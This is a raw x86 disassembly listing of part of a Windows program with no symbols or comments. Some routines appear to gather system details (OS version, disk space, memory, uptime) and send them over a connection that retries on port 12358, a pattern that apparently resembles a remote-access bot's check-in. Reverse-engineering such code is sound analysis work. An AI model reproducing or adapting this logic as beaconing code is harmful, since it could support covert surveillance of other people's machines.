  4086de:	68 7c e1 40 00       	push   $0x40e17c
  4086e3:	68 28 e7 40 00       	push   $0x40e728
  4086e8:	ff d6                	call   *%esi
  4086ea:	68 58 e5 40 00       	push   $0x40e558
  4086ef:	e8 fc 0e 00 00       	call   0x4095f0
  4086f4:	83 c4 04             	add    $0x4,%esp
  4086f7:	85 c0                	test   %eax,%eax
  4086f9:	74 1e                	je     0x408719
  4086fb:	68 50 e5 40 00       	push   $0x40e550
  408700:	68 28 e7 40 00       	push   $0x40e728
  408705:	89 3d 58 e5 40 00    	mov    %edi,0x40e558
  40870b:	ff d6                	call   *%esi
  40870d:	68 7c e1 40 00       	push   $0x40e17c
  408712:	68 28 e7 40 00       	push   $0x40e728
  408717:	ff d6                	call   *%esi
  408719:	68 48 e5 40 00       	push   $0x40e548
  40871e:	e8 cd 0e 00 00       	call   0x4095f0
  408723:	83 c4 04             	add    $0x4,%esp
  408726:	85 c0                	test   %eax,%eax
  408728:	74 1e                	je     0x408748
  40872a:	68 3c e5 40 00       	push   $0x40e53c
  40872f:	68 28 e7 40 00       	push   $0x40e728
  408734:	89 3d 48 e5 40 00    	mov    %edi,0x40e548
  40873a:	ff d6                	call   *%esi
  40873c:	68 7c e1 40 00       	push   $0x40e17c
  408741:	68 28 e7 40 00       	push   $0x40e728
  408746:	ff d6                	call   *%esi
  408748:	68 34 e5 40 00       	push   $0x40e534
  40874d:	e8 9e 0e 00 00       	call   0x4095f0
  408752:	83 c4 04             	add    $0x4,%esp
  408755:	85 c0                	test   %eax,%eax
  408757:	74 1e                	je     0x408777
  408759:	68 28 e5 40 00       	push   $0x40e528
  40875e:	68 28 e7 40 00       	push   $0x40e728
  408763:	89 3d 34 e5 40 00    	mov    %edi,0x40e534
  408769:	ff d6                	call   *%esi
  40876b:	68 7c e1 40 00       	push   $0x40e17c
  408770:	68 28 e7 40 00       	push   $0x40e728
  408775:	ff d6                	call   *%esi
  408777:	68 1c e5 40 00       	push   $0x40e51c
  40877c:	e8 6f 0e 00 00       	call   0x4095f0
  408781:	83 c4 04             	add    $0x4,%esp
  408784:	85 c0                	test   %eax,%eax
  408786:	74 1e                	je     0x4087a6
  408788:	68 10 e5 40 00       	push   $0x40e510
  40878d:	68 28 e7 40 00       	push   $0x40e728
  408792:	89 3d 1c e5 40 00    	mov    %edi,0x40e51c
  408798:	ff d6                	call   *%esi
  40879a:	68 7c e1 40 00       	push   $0x40e17c
  40879f:	68 28 e7 40 00       	push   $0x40e728
  4087a4:	ff d6                	call   *%esi
  4087a6:	68 08 e5 40 00       	push   $0x40e508
  4087ab:	e8 40 0e 00 00       	call   0x4095f0
  4087b0:	83 c4 04             	add    $0x4,%esp
  4087b3:	85 c0                	test   %eax,%eax
  4087b5:	74 1e                	je     0x4087d5
  4087b7:	68 f8 e4 40 00       	push   $0x40e4f8
  4087bc:	68 28 e7 40 00       	push   $0x40e728
  4087c1:	89 3d 08 e5 40 00    	mov    %edi,0x40e508
  4087c7:	ff d6                	call   *%esi
  4087c9:	68 7c e1 40 00       	push   $0x40e17c
  4087ce:	68 28 e7 40 00       	push   $0x40e728
  4087d3:	ff d6                	call   *%esi
  4087d5:	68 f0 e4 40 00       	push   $0x40e4f0
  4087da:	e8 11 0e 00 00       	call   0x4095f0
  4087df:	83 c4 04             	add    $0x4,%esp
  4087e2:	85 c0                	test   %eax,%eax
  4087e4:	74 1e                	je     0x408804
  4087e6:	68 e4 e4 40 00       	push   $0x40e4e4
  4087eb:	68 28 e7 40 00       	push   $0x40e728
  4087f0:	89 3d f0 e4 40 00    	mov    %edi,0x40e4f0
  4087f6:	ff d6                	call   *%esi
  4087f8:	68 7c e1 40 00       	push   $0x40e17c
  4087fd:	68 28 e7 40 00       	push   $0x40e728
  408802:	ff d6                	call   *%esi
  408804:	68 dc e4 40 00       	push   $0x40e4dc
  408809:	e8 e2 0d 00 00       	call   0x4095f0
  40880e:	83 c4 04             	add    $0x4,%esp
  408811:	85 c0                	test   %eax,%eax
  408813:	74 1e                	je     0x408833
  408815:	68 d0 e4 40 00       	push   $0x40e4d0
  40881a:	68 28 e7 40 00       	push   $0x40e728
  40881f:	89 3d dc e4 40 00    	mov    %edi,0x40e4dc
  408825:	ff d6                	call   *%esi
  408827:	68 7c e1 40 00       	push   $0x40e17c
  40882c:	68 28 e7 40 00       	push   $0x40e728
  408831:	ff d6                	call   *%esi
  408833:	68 c0 e4 40 00       	push   $0x40e4c0
  408838:	e8 b3 0d 00 00       	call   0x4095f0
  40883d:	83 c4 04             	add    $0x4,%esp
  408840:	85 c0                	test   %eax,%eax
  408842:	74 1e                	je     0x408862
  408844:	68 b8 e4 40 00       	push   $0x40e4b8
  408849:	68 28 e7 40 00       	push   $0x40e728
  40884e:	89 3d c0 e4 40 00    	mov    %edi,0x40e4c0
  408854:	ff d6                	call   *%esi
  408856:	68 7c e1 40 00       	push   $0x40e17c
  40885b:	68 28 e7 40 00       	push   $0x40e728
  408860:	ff d6                	call   *%esi
  408862:	68 b0 e4 40 00       	push   $0x40e4b0
  408867:	e8 84 0d 00 00       	call   0x4095f0
  40886c:	83 c4 04             	add    $0x4,%esp
  40886f:	85 c0                	test   %eax,%eax
  408871:	74 1e                	je     0x408891
  408873:	68 a4 e4 40 00       	push   $0x40e4a4
  408878:	68 28 e7 40 00       	push   $0x40e728
  40887d:	89 3d b0 e4 40 00    	mov    %edi,0x40e4b0
  408883:	ff d6                	call   *%esi
  408885:	68 7c e1 40 00       	push   $0x40e17c
  40888a:	68 28 e7 40 00       	push   $0x40e728
  40888f:	ff d6                	call   *%esi
  408891:	68 9c e4 40 00       	push   $0x40e49c
  408896:	e8 55 0d 00 00       	call   0x4095f0
  40889b:	83 c4 04             	add    $0x4,%esp
  40889e:	85 c0                	test   %eax,%eax
  4088a0:	74 1e                	je     0x4088c0
  4088a2:	68 94 e4 40 00       	push   $0x40e494
  4088a7:	68 28 e7 40 00       	push   $0x40e728
  4088ac:	89 3d 9c e4 40 00    	mov    %edi,0x40e49c
  4088b2:	ff d6                	call   *%esi
  4088b4:	68 7c e1 40 00       	push   $0x40e17c
  4088b9:	68 28 e7 40 00       	push   $0x40e728
  4088be:	ff d6                	call   *%esi
  4088c0:	68 7c e1 40 00       	push   $0x40e17c
  4088c5:	68 28 e7 40 00       	push   $0x40e728
  4088ca:	ff 15 50 b2 40 00    	call   *0x40b250
  4088d0:	83 c4 08             	add    $0x8,%esp
  4088d3:	85 c0                	test   %eax,%eax
  4088d5:	75 0c                	jne    0x4088e3
  4088d7:	68 8c e4 40 00       	push   $0x40e48c
  4088dc:	68 28 e7 40 00       	push   $0x40e728
  4088e1:	ff d6                	call   *%esi
  4088e3:	5f                   	pop    %edi
  4088e4:	b8 28 e7 40 00       	mov    $0x40e728,%eax
  4088e9:	5e                   	pop    %esi
  4088ea:	c3                   	ret
  4088eb:	90                   	nop
  4088ec:	90                   	nop
  4088ed:	90                   	nop
  4088ee:	90                   	nop
  4088ef:	90                   	nop
  4088f0:	81 ec fc 05 00 00    	sub    $0x5fc,%esp
  4088f6:	53                   	push   %ebx
  4088f7:	55                   	push   %ebp
  4088f8:	56                   	push   %esi
  4088f9:	8b 1d f8 b0 40 00    	mov    0x40b0f8,%ebx
  4088ff:	57                   	push   %edi
  408900:	b9 a8 00 00 00       	mov    $0xa8,%ecx
  408905:	33 c0                	xor    %eax,%eax
  408907:	8d bc 24 a4 00 00 00 	lea    0xa4(%esp),%edi
  40890e:	f3 ab                	rep stos %eax,%es:(%edi)
  408910:	88 84 24 da 02 00 00 	mov    %al,0x2da(%esp)
  408917:	8d 84 24 a8 00 00 00 	lea    0xa8(%esp),%eax
  40891e:	bd 9c 00 00 00       	mov    $0x9c,%ebp
  408923:	50                   	push   %eax
  408924:	c6 84 24 a8 00 00 00 	movb   $0x66,0xa8(%esp)
  40892b:	66 
  40892c:	89 ac 24 ac 00 00 00 	mov    %ebp,0xac(%esp)
  408933:	ff d3                	call   *%ebx
  408935:	8b 94 24 10 06 00 00 	mov    0x610(%esp),%edx
  40893c:	8d 8c 24 0c 05 00 00 	lea    0x50c(%esp),%ecx
  408943:	68 00 01 00 00       	push   $0x100
  408948:	51                   	push   %ecx
  408949:	52                   	push   %edx
  40894a:	e8 e1 fa ff ff       	call   0x408430
  40894f:	33 c0                	xor    %eax,%eax
  408951:	83 c4 0c             	add    $0xc,%esp
  408954:	89 44 24 30          	mov    %eax,0x30(%esp)
  408958:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  40895c:	89 44 24 34          	mov    %eax,0x34(%esp)
  408960:	51                   	push   %ecx
  408961:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  408965:	8d 54 24 34          	lea    0x34(%esp),%edx
  408969:	89 44 24 40          	mov    %eax,0x40(%esp)
  40896d:	8b 84 24 18 06 00 00 	mov    0x618(%esp),%eax
  408974:	52                   	push   %edx
  408975:	c7 44 24 2c 10 00 00 	movl   $0x10,0x2c(%esp)
  40897c:	00 
  40897d:	8b 88 a8 00 00 00    	mov    0xa8(%eax),%ecx
  408983:	51                   	push   %ecx
  408984:	ff 15 fc b3 40 00    	call   *0x40b3fc
  40898a:	8b 54 24 34          	mov    0x34(%esp),%edx
  40898e:	b9 0c 00 00 00       	mov    $0xc,%ecx
  408993:	8d b4 24 0c 05 00 00 	lea    0x50c(%esp),%esi
  40899a:	8d bc 24 a8 02 00 00 	lea    0x2a8(%esp),%edi
  4089a1:	89 94 24 a4 02 00 00 	mov    %edx,0x2a4(%esp)
  4089a8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4089aa:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  4089ac:	e8 1f fa ff ff       	call   0x4083d0
  4089b1:	89 84 24 44 01 00 00 	mov    %eax,0x144(%esp)
  4089b8:	8d 84 24 44 03 00 00 	lea    0x344(%esp),%eax
  4089bf:	50                   	push   %eax
  4089c0:	89 ac 24 48 03 00 00 	mov    %ebp,0x348(%esp)
  4089c7:	ff d3                	call   *%ebx
  4089c9:	8b 84 24 48 03 00 00 	mov    0x348(%esp),%eax
  4089d0:	8b 3d 78 b3 40 00    	mov    0x40b378,%edi
  4089d6:	83 f8 05             	cmp    $0x5,%eax
  4089d9:	75 20                	jne    0x4089fb
  4089db:	8b 84 24 4c 03 00 00 	mov    0x34c(%esp),%eax
  4089e2:	85 c0                	test   %eax,%eax
  4089e4:	75 15                	jne    0x4089fb
  4089e6:	8d 8c 24 48 01 00 00 	lea    0x148(%esp),%ecx
  4089ed:	68 84 e6 40 00       	push   $0x40e684
  4089f2:	51                   	push   %ecx
  4089f3:	ff 15 d4 b0 40 00    	call   *0x40b0d4
  4089f9:	eb 28                	jmp    0x408a23
  4089fb:	8d 94 24 80 00 00 00 	lea    0x80(%esp),%edx
  408a02:	52                   	push   %edx
  408a03:	ff 15 b4 b1 40 00    	call   *0x40b1b4
  408a09:	8b 84 24 94 00 00 00 	mov    0x94(%esp),%eax
  408a10:	8d 8c 24 48 01 00 00 	lea    0x148(%esp),%ecx
  408a17:	50                   	push   %eax
  408a18:	68 00 e4 40 00       	push   $0x40e400
  408a1d:	51                   	push   %ecx
  408a1e:	ff d7                	call   *%edi
  408a20:	83 c4 0c             	add    $0xc,%esp
  408a23:	8d 54 24 40          	lea    0x40(%esp),%edx
  408a27:	c7 44 24 40 40 00 00 	movl   $0x40,0x40(%esp)
  408a2e:	00 
  408a2f:	52                   	push   %edx
  408a30:	ff 15 00 b2 40 00    	call   *0x40b200
  408a36:	8b 44 24 48          	mov    0x48(%esp),%eax
  408a3a:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  408a3e:	b9 14 00 00 00       	mov    $0x14,%ecx
  408a43:	e8 28 1d 00 00       	call   0x40a770
  408a48:	33 db                	xor    %ebx,%ebx
  408a4a:	33 f6                	xor    %esi,%esi
  408a4c:	89 84 24 5c 01 00 00 	mov    %eax,0x15c(%esp)
  408a53:	33 ed                	xor    %ebp,%ebp
  408a55:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  408a59:	8a c3                	mov    %bl,%al
  408a5b:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  408a5f:	04 42                	add    $0x42,%al
  408a61:	51                   	push   %ecx
  408a62:	88 44 24 1c          	mov    %al,0x1c(%esp)
  408a66:	c6 44 24 1d 3a       	movb   $0x3a,0x1d(%esp)
  408a6b:	c6 44 24 1e 5c       	movb   $0x5c,0x1e(%esp)
  408a70:	c6 44 24 1f 00       	movb   $0x0,0x1f(%esp)
  408a75:	ff 15 10 b1 40 00    	call   *0x40b110
  408a7b:	83 f8 03             	cmp    $0x3,%eax
  408a7e:	75 3a                	jne    0x408aba
  408a80:	8d 54 24 28          	lea    0x28(%esp),%edx
  408a84:	6a 00                	push   $0x0
  408a86:	52                   	push   %edx
  408a87:	8d 44 24 20          	lea    0x20(%esp),%eax
  408a8b:	6a 00                	push   $0x0
  408a8d:	50                   	push   %eax
  408a8e:	ff 15 14 b1 40 00    	call   *0x40b114
  408a94:	85 c0                	test   %eax,%eax
  408a96:	74 22                	je     0x408aba
  408a98:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  408a9c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  408aa0:	8b 54 24 14          	mov    0x14(%esp),%edx
  408aa4:	03 e9                	add    %ecx,%ebp
  408aa6:	13 d0                	adc    %eax,%edx
  408aa8:	b9 14 00 00 00       	mov    $0x14,%ecx
  408aad:	8b c5                	mov    %ebp,%eax
  408aaf:	89 54 24 14          	mov    %edx,0x14(%esp)
  408ab3:	e8 b8 1c 00 00       	call   0x40a770
  408ab8:	8b f0                	mov    %eax,%esi
  408aba:	43                   	inc    %ebx
  408abb:	83 fb 1a             	cmp    $0x1a,%ebx
  408abe:	7c 99                	jl     0x408a59
  408ac0:	89 74 24 10          	mov    %esi,0x10(%esp)
  408ac4:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  408acb:	00 
  408acc:	df 6c 24 10          	fildll 0x10(%esp)
  408ad0:	e8 2b 1c 00 00       	call   0x40a700
  408ad5:	89 84 24 60 01 00 00 	mov    %eax,0x160(%esp)
  408adc:	ff 15 7c b1 40 00    	call   *0x40b17c
  408ae2:	8b f0                	mov    %eax,%esi
  408ae4:	b8 3b d4 b5 31       	mov    $0x31b5d43b,%eax
  408ae9:	f7 ee                	imul   %esi
  408aeb:	c1 fa 18             	sar    $0x18,%edx
  408aee:	8b ca                	mov    %edx,%ecx
  408af0:	c1 e9 1f             	shr    $0x1f,%ecx
  408af3:	03 d1                	add    %ecx,%edx
  408af5:	52                   	push   %edx
  408af6:	8d 94 24 e4 03 00 00 	lea    0x3e4(%esp),%edx
  408afd:	68 00 e4 40 00       	push   $0x40e400
  408b02:	52                   	push   %edx
  408b03:	ff d7                	call   *%edi
  408b05:	8b c6                	mov    %esi,%eax
  408b07:	b9 00 5c 26 05       	mov    $0x5265c00,%ecx
  408b0c:	99                   	cltd
  408b0d:	f7 f9                	idiv   %ecx
  408b0f:	b8 59 be 90 4a       	mov    $0x4a90be59,%eax
  408b14:	8d 8c 24 b4 04 00 00 	lea    0x4b4(%esp),%ecx
  408b1b:	8b f2                	mov    %edx,%esi
  408b1d:	f7 ee                	imul   %esi
  408b1f:	c1 fa 14             	sar    $0x14,%edx
  408b22:	8b c2                	mov    %edx,%eax
  408b24:	c1 e8 1f             	shr    $0x1f,%eax
  408b27:	03 d0                	add    %eax,%edx
  408b29:	52                   	push   %edx
  408b2a:	68 00 e4 40 00       	push   $0x40e400
  408b2f:	51                   	push   %ecx
  408b30:	ff d7                	call   *%edi
  408b32:	8b c6                	mov    %esi,%eax
  408b34:	b9 80 ee 36 00       	mov    $0x36ee80,%ecx
  408b39:	99                   	cltd
  408b3a:	f7 f9                	idiv   %ecx
  408b3c:	b8 73 b2 e7 45       	mov    $0x45e7b273,%eax
  408b41:	8d 8c 24 5c 04 00 00 	lea    0x45c(%esp),%ecx
  408b48:	f7 ea                	imul   %edx
  408b4a:	c1 fa 0e             	sar    $0xe,%edx
  408b4d:	8b c2                	mov    %edx,%eax
  408b4f:	c1 e8 1f             	shr    $0x1f,%eax
  408b52:	03 d0                	add    %eax,%edx
  408b54:	52                   	push   %edx
  408b55:	68 00 e4 40 00       	push   $0x40e400
  408b5a:	51                   	push   %ecx
  408b5b:	ff d7                	call   *%edi
  408b5d:	8d 94 24 68 04 00 00 	lea    0x468(%esp),%edx
  408b64:	8d 84 24 cc 04 00 00 	lea    0x4cc(%esp),%eax
  408b6b:	52                   	push   %edx
  408b6c:	8d 8c 24 08 04 00 00 	lea    0x408(%esp),%ecx
  408b73:	50                   	push   %eax
  408b74:	51                   	push   %ecx
  408b75:	8d 94 24 94 01 00 00 	lea    0x194(%esp),%edx
  408b7c:	68 70 e6 40 00       	push   $0x40e670
  408b81:	52                   	push   %edx
  408b82:	ff d7                	call   *%edi
  408b84:	a1 40 e8 40 00       	mov    0x40e840,%eax
  408b89:	68 68 e6 40 00       	push   $0x40e668
  408b8e:	50                   	push   %eax
  408b8f:	e8 7c be ff ff       	call   0x404a10
  408b94:	83 c4 40             	add    $0x40,%esp
  408b97:	85 c0                	test   %eax,%eax
  408b99:	74 32                	je     0x408bcd
  408b9b:	83 c0 06             	add    $0x6,%eax
  408b9e:	50                   	push   %eax
  408b9f:	e8 dc f7 ff ff       	call   0x408380
  408ba4:	8b f8                	mov    %eax,%edi
  408ba6:	83 c9 ff             	or     $0xffffffff,%ecx
  408ba9:	33 c0                	xor    %eax,%eax
  408bab:	83 c4 04             	add    $0x4,%esp
  408bae:	f2 ae                	repnz scas %es:(%edi),%al
  408bb0:	f7 d1                	not    %ecx
  408bb2:	2b f9                	sub    %ecx,%edi
  408bb4:	8d 94 24 90 02 00 00 	lea    0x290(%esp),%edx
  408bbb:	8b c1                	mov    %ecx,%eax
  408bbd:	8b f7                	mov    %edi,%esi
  408bbf:	8b fa                	mov    %edx,%edi
  408bc1:	c1 e9 02             	shr    $0x2,%ecx
  408bc4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  408bc6:	8b c8                	mov    %eax,%ecx
  408bc8:	83 e1 03             	and    $0x3,%ecx
  408bcb:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  408bcd:	8b 8c 24 18 06 00 00 	mov    0x618(%esp),%ecx
  408bd4:	89 8c 24 dc 02 00 00 	mov    %ecx,0x2dc(%esp)
  408bdb:	e8 f0 f8 ff ff       	call   0x4084d0
  408be0:	8b f8                	mov    %eax,%edi
  408be2:	83 c9 ff             	or     $0xffffffff,%ecx
  408be5:	33 c0                	xor    %eax,%eax
  408be7:	8d 94 24 e0 02 00 00 	lea    0x2e0(%esp),%edx
  408bee:	f2 ae                	repnz scas %es:(%edi),%al
  408bf0:	f7 d1                	not    %ecx
  408bf2:	2b f9                	sub    %ecx,%edi
  408bf4:	68 60 e6 40 00       	push   $0x40e660
  408bf9:	8b c1                	mov    %ecx,%eax
  408bfb:	8b f7                	mov    %edi,%esi
  408bfd:	8b fa                	mov    %edx,%edi
  408bff:	c1 e9 02             	shr    $0x2,%ecx
  408c02:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  408c04:	8b c8                	mov    %eax,%ecx
  408c06:	83 e1 03             	and    $0x3,%ecx
  408c09:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  408c0b:	8b 0d 40 e8 40 00    	mov    0x40e840,%ecx
  408c11:	51                   	push   %ecx
  408c12:	e8 f9 bd ff ff       	call   0x404a10
  408c17:	83 c4 08             	add    $0x8,%esp
  408c1a:	85 c0                	test   %eax,%eax
  408c1c:	74 32                	je     0x408c50
  408c1e:	83 c0 06             	add    $0x6,%eax
  408c21:	50                   	push   %eax
  408c22:	e8 59 f7 ff ff       	call   0x408380
  408c27:	8b f8                	mov    %eax,%edi
  408c29:	83 c9 ff             	or     $0xffffffff,%ecx
  408c2c:	33 c0                	xor    %eax,%eax
  408c2e:	83 c4 04             	add    $0x4,%esp
  408c31:	f2 ae                	repnz scas %es:(%edi),%al
  408c33:	f7 d1                	not    %ecx
  408c35:	2b f9                	sub    %ecx,%edi
  408c37:	8d 94 24 30 03 00 00 	lea    0x330(%esp),%edx
  408c3e:	8b c1                	mov    %ecx,%eax
  408c40:	8b f7                	mov    %edi,%esi
  408c42:	8b fa                	mov    %edx,%edi
  408c44:	c1 e9 02             	shr    $0x2,%ecx
  408c47:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  408c49:	8b c8                	mov    %eax,%ecx
  408c4b:	83 e1 03             	and    $0x3,%ecx
  408c4e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  408c50:	8d 8c 24 a4 00 00 00 	lea    0xa4(%esp),%ecx
  408c57:	68 a0 02 00 00       	push   $0x2a0
  408c5c:	51                   	push   %ecx
  408c5d:	8b 8c 24 1c 06 00 00 	mov    0x61c(%esp),%ecx
  408c64:	e8 87 95 ff ff       	call   0x4021f0
  408c69:	5f                   	pop    %edi
  408c6a:	5e                   	pop    %esi
  408c6b:	5d                   	pop    %ebp
  408c6c:	5b                   	pop    %ebx
  408c6d:	81 c4 fc 05 00 00    	add    $0x5fc,%esp
  408c73:	c3                   	ret
  408c74:	90                   	nop
  408c75:	90                   	nop
  408c76:	90                   	nop
  408c77:	90                   	nop
  408c78:	90                   	nop
  408c79:	90                   	nop
  408c7a:	90                   	nop
  408c7b:	90                   	nop
  408c7c:	90                   	nop
  408c7d:	90                   	nop
  408c7e:	90                   	nop
  408c7f:	90                   	nop
  408c80:	6a ff                	push   $0xffffffff
  408c82:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  408c88:	68 56 ad 40 00       	push   $0x40ad56
  408c8d:	50                   	push   %eax
  408c8e:	b8 48 a0 00 00       	mov    $0xa048,%eax
  408c93:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  408c9a:	e8 71 1a 00 00       	call   0x40a710
  408c9f:	53                   	push   %ebx
  408ca0:	55                   	push   %ebp
  408ca1:	56                   	push   %esi
  408ca2:	57                   	push   %edi
  408ca3:	6a 01                	push   $0x1
  408ca5:	ff 15 b8 b1 40 00    	call   *0x40b1b8
  408cab:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  408caf:	e8 9c 8e ff ff       	call   0x401b50
  408cb4:	8b 2d 7c b1 40 00    	mov    0x40b17c,%ebp
  408cba:	8b 1d dc b1 40 00    	mov    0x40b1dc,%ebx
  408cc0:	c7 84 24 60 a0 00 00 	movl   $0x0,0xa060(%esp)
  408cc7:	00 00 00 00 
  408ccb:	ff d5                	call   *%ebp
  408ccd:	68 46 30 00 00       	push   $0x3046
  408cd2:	68 88 e6 40 00       	push   $0x40e688
  408cd7:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  408cdb:	8b f8                	mov    %eax,%edi
  408cdd:	e8 1e 90 ff ff       	call   0x401d00
  408ce2:	84 c0                	test   %al,%al
  408ce4:	74 e5                	je     0x408ccb
  408ce6:	ff d5                	call   *%ebp
  408ce8:	8b 0d 4c e8 40 00    	mov    0x40e84c,%ecx
  408cee:	8b f0                	mov    %eax,%esi
  408cf0:	68 46 30 00 00       	push   $0x3046
  408cf5:	8d 84 24 cc 00 00 00 	lea    0xcc(%esp),%eax
  408cfc:	68 88 e6 40 00       	push   $0x40e688
  408d01:	50                   	push   %eax
  408d02:	8d 94 24 08 01 00 00 	lea    0x108(%esp),%edx
  408d09:	51                   	push   %ecx
  408d0a:	8d 44 24 20          	lea    0x20(%esp),%eax
  408d0e:	52                   	push   %edx
  408d0f:	50                   	push   %eax
  408d10:	8d 8c 24 14 02 00 00 	lea    0x214(%esp),%ecx
  408d17:	2b f7                	sub    %edi,%esi
  408d19:	e8 62 ca ff ff       	call   0x405780
  408d1e:	8d 8c 24 fc 01 00 00 	lea    0x1fc(%esp),%ecx
  408d25:	c6 84 24 60 a0 00 00 	movb   $0x1,0xa060(%esp)
  408d2c:	01 
  408d2d:	51                   	push   %ecx
  408d2e:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  408d32:	e8 c9 96 ff ff       	call   0x402400
  408d37:	ff d5                	call   *%ebp
  408d39:	2b c6                	sub    %esi,%eax
  408d3b:	8d 54 24 10          	lea    0x10(%esp),%edx
  408d3f:	50                   	push   %eax
  408d40:	8d 84 24 00 01 00 00 	lea    0x100(%esp),%eax
  408d47:	52                   	push   %edx
  408d48:	50                   	push   %eax
  408d49:	e8 a2 fb ff ff       	call   0x4088f0
  408d4e:	83 c4 0c             	add    $0xc,%esp
  408d51:	85 c0                	test   %eax,%eax
  408d53:	7f 22                	jg     0x408d77
  408d55:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  408d59:	e8 12 94 ff ff       	call   0x402170
  408d5e:	8d 8c 24 fc 01 00 00 	lea    0x1fc(%esp),%ecx
  408d65:	c6 84 24 60 a0 00 00 	movb   $0x0,0xa060(%esp)
  408d6c:	00 
  408d6d:	e8 ae ca ff ff       	call   0x405820
  408d72:	e9 54 ff ff ff       	jmp    0x408ccb
  408d77:	8b 8c 24 bc 00 00 00 	mov    0xbc(%esp),%ecx
  408d7e:	6a 64                	push   $0x64
  408d80:	51                   	push   %ecx
  408d81:	ff d3                	call   *%ebx
  408d83:	68 f4 01 00 00       	push   $0x1f4
  408d88:	8b f0                	mov    %eax,%esi
  408d8a:	ff 15 c4 b0 40 00    	call   *0x40b0c4
  408d90:	a1 64 e9 40 00       	mov    0x40e964,%eax
  408d95:	85 f6                	test   %esi,%esi
  408d97:	74 06                	je     0x408d9f
  408d99:	85 c0                	test   %eax,%eax
  408d9b:	75 06                	jne    0x408da3
  408d9d:	eb d8                	jmp    0x408d77
  408d9f:	85 c0                	test   %eax,%eax
  408da1:	74 bb                	je     0x408d5e
  408da3:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  408da7:	e8 c4 93 ff ff       	call   0x402170
  408dac:	8d 8c 24 fc 01 00 00 	lea    0x1fc(%esp),%ecx
  408db3:	c6 84 24 60 a0 00 00 	movb   $0x0,0xa060(%esp)
  408dba:	00 
  408dbb:	e8 60 ca ff ff       	call   0x405820
  408dc0:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  408dc4:	c7 84 24 60 a0 00 00 	movl   $0xffffffff,0xa060(%esp)
  408dcb:	ff ff ff ff 
  408dcf:	e8 6c 8e ff ff       	call   0x401c40
  408dd4:	8b 8c 24 58 a0 00 00 	mov    0xa058(%esp),%ecx
  408ddb:	5f                   	pop    %edi
  408ddc:	5e                   	pop    %esi
  408ddd:	5d                   	pop    %ebp
  408dde:	5b                   	pop    %ebx
  408ddf:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  408de6:	81 c4 54 a0 00 00    	add    $0xa054,%esp
  408dec:	c2 04 00             	ret    $0x4
  408def:	90                   	nop
  408df0:	56                   	push   %esi
  408df1:	6a 00                	push   $0x0
  408df3:	6a 00                	push   $0x0
  408df5:	6a 00                	push   $0x0
  408df7:	68 54 e8 40 00       	push   $0x40e854
  408dfc:	68 80 8c 40 00       	push   $0x408c80
  408e01:	6a 00                	push   $0x0
  408e03:	6a 00                	push   $0x0
  408e05:	e8 66 07 00 00       	call   0x409570
  408e0a:	83 c4 1c             	add    $0x1c,%esp
  408e0d:	8b f0                	mov    %eax,%esi
  408e0f:	6a ff                	push   $0xffffffff
  408e11:	56                   	push   %esi
  408e12:	ff 15 dc b1 40 00    	call   *0x40b1dc
  408e18:	56                   	push   %esi
  408e19:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  408e1f:	33 c0                	xor    %eax,%eax
  408e21:	5e                   	pop    %esi
  408e22:	c2 10 00             	ret    $0x10
  408e25:	90                   	nop
  408e26:	90                   	nop
  408e27:	90                   	nop
  408e28:	90                   	nop
  408e29:	90                   	nop
  408e2a:	90                   	nop
  408e2b:	90                   	nop
  408e2c:	90                   	nop
  408e2d:	90                   	nop
  408e2e:	90                   	nop
  408e2f:	90                   	nop
  408e30:	6a ff                	push   $0xffffffff
  408e32:	68 68 ad 40 00       	push   $0x40ad68
  408e37:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  408e3d:	50                   	push   %eax
  408e3e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  408e45:	51                   	push   %ecx
  408e46:	8b 44 24 14          	mov    0x14(%esp),%eax
  408e4a:	56                   	push   %esi
  408e4b:	8b f1                	mov    %ecx,%esi
  408e4d:	50                   	push   %eax
  408e4e:	89 74 24 08          	mov    %esi,0x8(%esp)
  408e52:	e8 c9 d0 ff ff       	call   0x405f20
  408e57:	8b ce                	mov    %esi,%ecx
  408e59:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  408e60:	00 
  408e61:	c7 06 e4 b4 40 00    	movl   $0x40b4e4,(%esi)
  408e67:	e8 b4 00 00 00       	call   0x408f20
  408e6c:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  408e70:	8b c6                	mov    %esi,%eax
  408e72:	5e                   	pop    %esi
  408e73:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  408e7a:	83 c4 10             	add    $0x10,%esp
  408e7d:	c2 04 00             	ret    $0x4
  408e80:	56                   	push   %esi
  408e81:	8b f1                	mov    %ecx,%esi
  408e83:	e8 18 00 00 00       	call   0x408ea0
  408e88:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  408e8d:	74 09                	je     0x408e98
  408e8f:	56                   	push   %esi
  408e90:	e8 51 18 00 00       	call   0x40a6e6
  408e95:	83 c4 04             	add    $0x4,%esp
  408e98:	8b c6                	mov    %esi,%eax
  408e9a:	5e                   	pop    %esi
  408e9b:	c2 04 00             	ret    $0x4
  408e9e:	90                   	nop
  408e9f:	90                   	nop
